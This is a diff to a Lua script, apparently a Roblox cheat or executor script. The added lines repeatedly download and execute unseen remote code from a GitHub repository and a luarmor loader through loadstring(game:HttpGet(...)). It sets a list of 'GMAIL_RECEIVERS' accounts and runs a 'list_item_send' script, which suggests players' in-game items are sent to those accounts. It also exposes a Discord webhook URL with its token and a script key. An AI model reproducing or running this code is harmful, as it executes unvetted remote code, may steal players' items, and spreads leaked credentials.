@@ -25,11 +25,38 @@ local targetNames = {"sijmongirthss","1940Mosier3104","soystaylan5","dreddyewele
 
 if table.find(targetNames, player.Name) then
 
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/aztbuirczzxmmcx1zz/9xmin7bszzmiay87zpqla/refs/heads/main/PLAZA_ITEM_SELL"))()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/aztbuirczzxmmcx1zz/9xmin7bszzmiay87zpqla/refs/heads/main/PLAZA_ITEM_SELL"))()
 
 else
 
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/aztbuirczzxmmcx1zz/9xmin7bszzmiay87zpqla/refs/heads/main/vinx"))()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/aztbuirczzxmmcx1zz/9xmin7bszzmiay87zpqla/refs/heads/main/teleport_w1234"))()
+		
+		
+		
+		---------------------------------------------------------------------------------------------------------------------------
+		
+		getgenv().GMAIL_RECEIVERS = {"sijmongirthss","1940Mosier3104","soystaylan5","dreddyewele60","1971Nowak3135","mcconchifredjeyo","ecclweltst","killedsanthi85","tamuleviazulayv","hegemangaltieri81"}
+		
+		---------------------------------------------------------------------------------------------------------------------------
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/aztbuirczzxmmcx1zz/9xmin7bszzmiay87zpqla/refs/heads/main/list_item_send"))()
+		
+		
+		
+		
+		script_key = "IAMAiZhmvPSarFAwYGimVtcLzrqIAnAQ";
+		
+		
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/aztbuirczzxmmcx1zz/9xmin7bszzmiay87zpqla/refs/heads/main/_EVENT_scriptphu"))()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/aztbuirczzxmmcx1zz/9xmin7bszzmiay87zpqla/refs/heads/main/_EVENT_GS_all_setting"))()
+		
+		--loadstring(game:HttpGet("https://raw.githubusercontent.com/aztbuirczzxmmcx1zz/9xmin7bszzmiay87zpqla/refs/heads/main/_farm_ngoai_scriptphu"))()
+		--loadstring(game:HttpGet("https://raw.githubusercontent.com/aztbuirczzxmmcx1zz/9xmin7bszzmiay87zpqla/refs/heads/main/_farm_ngoai_GS_all_setting"))()
+		
+		
+		getgenv().GWEBHOOK_LINK = "https://discord.com/api/webhooks/1389086515103268905/3r2_d7E4PK1koEO35uL_GLCo1ephCQCJvKfL2J9kb6XWKQxk7abnKeF9ngyu3-wGqj4e"
+		
+		loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/ba2dcad2127dcfc04301dfe52ce6c61c.lua"))()
+		--loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/34915da4ad87a5028e1fd64efbe3543f.lua"))()    --key farm
 
 end
 
